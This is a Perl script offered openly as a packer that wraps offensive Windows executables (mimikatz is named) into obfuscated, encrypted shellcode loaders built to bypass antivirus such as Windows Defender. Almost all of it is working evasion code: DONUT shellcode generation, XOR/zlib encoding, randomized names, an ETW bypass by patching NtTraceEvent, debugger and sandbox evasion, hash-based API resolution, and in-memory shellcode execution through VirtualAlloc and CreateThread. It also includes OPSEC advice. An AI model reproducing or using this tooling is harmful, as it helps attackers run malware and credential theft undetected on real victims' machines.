# =================================================================================================================================================================
# 'Invoke-Perl-Pepacker.pl' is a PE packer perl script that aims to bypass AV solutions such as Windows Defender.
# It generates an obfuscated and encrypted perl script that embeds an offensive PE (x64 exe) and implements several antivirus bypass & defense evasion techniques.
# Note: It uses the great tool 'DONUT' (TheWover).
# Author: https://github.com/JFR-C / GNU General Public License v3.0
# =================================================================================================================================================================
# Features: 
# > Generation (using DONUT) of a shellcode that contains an embedded and encrypted version of the PE
# > Shellcode injection into the memory of the current process (Perl)
# > Shellcode encryption (XOR) and compression (Zlib)
# > Script obfuscation (function and variable names are randomized + multiple encoding layer)
# > ETW bypass in user-mode (patching 'NtTraceEvent')
# > Dynamic API resolution (via GetProcAddress + hash-based API resolution)
# > Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
# > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
# > Compatible with many offensive security tools (x64 EXE, unmanaged code, no GUI) such as mimikatz, pplblade, etc.
# OPSEC advice: remove all existing comments in this script before generating your obfuscated perl script loader.
# =================================================================================================================================================================
# Usage (example):
# + C:\path\perl> perl.exe .\Invoke-Perl-Pepacker.pl ".\PE-to-pack.exe" ".\obfuscated_script_loader.pl"
# =================================================================================================================================================================

use strict;
use warnings;
use File::Slurp;
use File::Basename;
use File::Spec;
use MIME::Base64;
use Compress::Zlib;

# Check arguments
die "Usage: perl Invoke-Perl-Pepacker.pl <PE-to-pack.exe> <obfuscated_script_loader.pl>\n" unless @ARGV == 2;

my ($input_file1, $output_file) = @ARGV;

my $filename_only = basename($input_file1);

my $script_dir = dirname(File::Spec->rel2abs($0));
my $donut_path = File::Spec->catfile($script_dir, "donut.exe");

die "donut.exe not found in script directory: $script_dir\n"
    unless -e $donut_path;

# Temporary file (i.e. shellcode generated with DONUT)
my $temp_file = "test.bin";

# Build the command
my $cmd = "\"$donut_path\" -i \"$filename_only\" --output \"$temp_file\"";

# Use DONUT to convert the PE into a shellcode 
my $result = system($cmd);

die "Failed to launch donut.exe (exit code $result)\n" if $result != 0;

# Read raw (donut) shellcode
my $raw = read_file($temp_file, binmode => ':raw');
my $escaped = join('', map { sprintf("\\x%02x", ord($_)) } split('', $raw));

# Delete the temporary file (i.e. shellcode generated with DONUT)
if (-e $temp_file) {
	unlink $temp_file or warn "Could not delete $temp_file: $!\n";
	}

# Random name generator
sub rand_name {
    my @chars = ('a'..'z', 'A'..'Z');
    return join('', map { $chars[rand @chars] } 1 + int(rand(3)) .. 8);
}

# Hash function (DJB2)
sub hash_djb2 {
    my $str = shift;
    my $hash = 5381;
    foreach my $c (split //, $str) {
        $hash = (($hash << 5) + $hash) + ord($c);
        $hash &= 0xFFFFFFFF;
    }
    return sprintf("0x%08X", $hash);
}

# Precomputed hashes
my %api_hashes = map { $_ => hash_djb2($_) } qw(
    VirtualAlloc RtlMoveMemory CreateThread WaitForSingleObject
    GetLastError IsDebuggerPresent GetModuleHandleA GetProcAddress VirtualProtect
);

# Randomized names
my %wrap = map { $_ => rand_name() } qw(b64 decoded delay patch oldProtect ntdll nttrace resolver);

# API resolver function
my $resolver = <<"RESOLVER";
sub $wrap{resolver} {
    use Win32::API;
    my \$dll = shift;
    my \$target_hash = shift;
    my \$GetProcAddress = Win32::API->new('kernel32', 'GetProcAddress', ['N','P'], 'N');
    my \$GetModuleHandle = Win32::API->new('kernel32', 'GetModuleHandleA', ['P'], 'N');
    my \$base = \$GetModuleHandle->Call(\$dll);

    my %known = (
        $api_hashes{VirtualAlloc}        => "VirtualAlloc",
        $api_hashes{RtlMoveMemory}       => "RtlMoveMemory",
        $api_hashes{CreateThread}        => "CreateThread",
        $api_hashes{WaitForSingleObject} => "WaitForSingleObject",
        $api_hashes{GetLastError}        => "GetLastError",
        $api_hashes{IsDebuggerPresent}   => "IsDebuggerPresent",
        $api_hashes{GetModuleHandleA}    => "GetModuleHandleA",
        $api_hashes{GetProcAddress}      => "GetProcAddress",
        $api_hashes{VirtualProtect}      => "VirtualProtect",
    );

    return \$GetProcAddress->Call(\$base, \$known{\$target_hash});
}
RESOLVER

# Inner shellcode runner (no re-import of RtlMoveMemory)
my $inner = <<"INNER";
use strict;
use warnings;
use MIME::Base64;
use Compress::Zlib;
use Win32::API;

$resolver

# Import RtlMoveMemory once
Win32::API->Import('kernel32', 'RtlMoveMemory', ['N','P','N'], 'V');

# ETW bypass in user-mode (patching 'NtTraceEvent')
my \$ntbase = Win32::API->new('kernel32', 'GetModuleHandleA', ['P'], 'N')->Call("ntdll.dll");
my \$nttrace = Win32::API->new('kernel32', 'GetProcAddress', ['N','P'], 'N')->Call(\$ntbase, "NtTraceEvent");

my \$vp = Win32::API->new('kernel32', 'VirtualProtect', ['N','N','N','P'], 'N');
my \$${wrap{oldProtect}} = pack("L", 0);
\$vp->Call(\$nttrace, 1, 0x40, \$${wrap{oldProtect}});

my \$${wrap{patch}} = "\\xC3";
RtlMoveMemory(\$nttrace, \$${wrap{patch}}, 1);

# Basic sandbox detection and evasion => Terminates execution if a debugger is detected
if (Win32::API->new('kernel32', 'IsDebuggerPresent', [], 'N')->Call()) {
    print "Debugger detected. Exiting.\\n";
    exit;
}

# Basic sandbox detection and evasion => Delayed execution
my \$${wrap{delay}} = 5 + int(rand(10));
print "Sleeping for \$${wrap{delay}} seconds...\\n";
sleep(\$${wrap{delay}});

my \$va = $wrap{resolver}("kernel32.dll", $api_hashes{VirtualAlloc});
my \$ct = $wrap{resolver}("kernel32.dll", $api_hashes{CreateThread});
my \$ws = $wrap{resolver}("kernel32.dll", $api_hashes{WaitForSingleObject});
my \$gle = $wrap{resolver}("kernel32.dll", $api_hashes{GetLastError});

my \$shellcode = "$escaped";
my \$size = length(\$shellcode);
print "Shellcode size: \$size bytes\n";

my \$VirtualAlloc = Win32::API->new('kernel32', 'VirtualAlloc', ['N','N','N','N'], 'N');
my \$ptr = \$VirtualAlloc->Call(0, \$size, 0x1000 | 0x2000, 0x04);  # RW
die "VirtualAlloc failed\n" unless \$ptr;

Win32::API->new('kernel32', 'RtlMoveMemory', ['N','P','N'], 'V')->Call(\$ptr, \$shellcode, \$size);

my \$VirtualProtect = Win32::API->new('kernel32', 'VirtualProtect', ['N','N','N','P'], 'N');
my \$oldProtect = pack('L', 0);
my \$result = \$VirtualProtect->Call(\$ptr, \$size, 0x20, \$oldProtect);  # RX
die "VirtualProtect failed\n" unless \$result;

my \$CreateThread = Win32::API->new('kernel32', 'CreateThread', ['N','N','N','N','N','N'], 'N');
my \$thread = \$CreateThread->Call(0, 0, \$ptr, 0, 0, 0);
die "Thread creation failed\n" unless \$thread;

Win32::API->new('kernel32', 'WaitForSingleObject', ['N','N'], 'N')->Call(\$thread, -1);
INNER

# Compress and encode
my $compressed = Compress::Zlib::compress($inner);
my $encoded = encode_base64($compressed, '');

# Wrapper script
my $wrapper = <<"WRAPPER";
use strict;
use warnings;
use MIME::Base64;
use Compress::Zlib;

# Decode and run
my \$${wrap{b64}} = <<'END_B64';
$encoded
END_B64

my \$${wrap{decoded}} = Compress::Zlib::uncompress(decode_base64(\$${wrap{b64}}));
eval \$${wrap{decoded}};
die "Execution failed: \$@" if \$@;
WRAPPER

# Write to file
write_file($output_file, $wrapper);
print "[+] The obfuscated shellcode loader script has been written to: $output_file\n";
